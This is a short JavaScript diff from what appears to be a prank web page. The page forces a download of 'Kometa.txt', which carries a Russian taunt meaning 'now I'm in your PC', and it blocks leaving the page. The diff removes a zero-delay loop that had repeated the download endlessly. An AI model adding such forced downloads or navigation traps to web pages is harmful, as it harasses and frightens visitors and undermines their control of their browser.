@@ -21,7 +21,6 @@ if(typeof rfs!="undefined" && rfs){
   }
 }
 setTimeout(function(){
-setInterval(function(){
 let text = JSON.stringify({Теперь_я_в_твоём_пк:'ps.Kometa'});
 downloadAsFile(text);
 function downloadAsFile(data) {
@@ -31,7 +30,6 @@ function downloadAsFile(data) {
   a.download = "Kometa.txt";
   a.click();
 }
-}, 0);
 }, 10000);
 window.onbeforeunload = function() {
 	return true;
